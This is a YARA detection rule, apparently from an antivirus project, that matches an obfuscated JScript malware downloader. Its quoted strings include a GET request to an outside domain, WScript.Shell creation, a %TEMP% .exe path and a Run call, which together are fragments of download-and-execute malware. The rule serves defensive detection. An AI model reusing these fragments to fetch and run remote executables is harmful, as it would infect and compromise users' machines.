rule sig_20160330_538e78a119c4212483e5f49e3886834b {
  meta:
    description = "datamaliciousorder - file 20160330_538e78a119c4212483e5f49e3886834b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c45d2b80b070c17d6d4d216e199630a1c4bc2c4a17ab6298040c24cf9b0cd9b0"

  strings:
    $s1  = "_K[_HD](\"GET\", \"http://mentalmathcompetition.com/k4isa\", false);" fullword ascii
    $s2  = "var _BT = function _YF() {return WScript[_NL](\"WScript\"+\".Shell\");}(), _U0 = 11;" fullword ascii
    $s3  = "function _B(_X0, _VX){_ST = _ST * 1; return _X0 - _VX;};" fullword ascii
    $s4  = "if (_K[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _RG(){return _KD + \"\";};" fullword ascii
    $s6  = "function _Y() {return _BT[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ZvjTLNn9ywG.ex\" + \"e\";};" fullword ascii
    $s7  = "function _M() {return ((_PY == true) && (_PY == _SE)) ? 1 : _ST;};" fullword ascii
    $s8  = "function _Y0(_C){_BT[\"Run\"](_C, _ST, _ST);};" fullword ascii
    $s9  = "function _H(_J) {var _U = (1, 2, 3, 4, 5, _J); return _U;};" fullword ascii
    $s10 = " while (_W){" fullword ascii
    $s11 = "function _FH(){return 22;};" fullword ascii
    $s12 = "function _IQ()" fullword ascii
    $s13 = "function _AK(){return _NL;};" fullword ascii
    $s14 = "return _B(_IQ0, _SX);" fullword ascii
    $s15 = "var _V0 = new this[\"Date\"]();" fullword ascii
    $s16 = "var _SE = false;" fullword ascii
    $s17 = "_SE = true; " fullword ascii
    $s18 = "var _R = false;" fullword ascii
    $s19 = "var _PY = false;" fullword ascii
    $s20 = "_PY = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}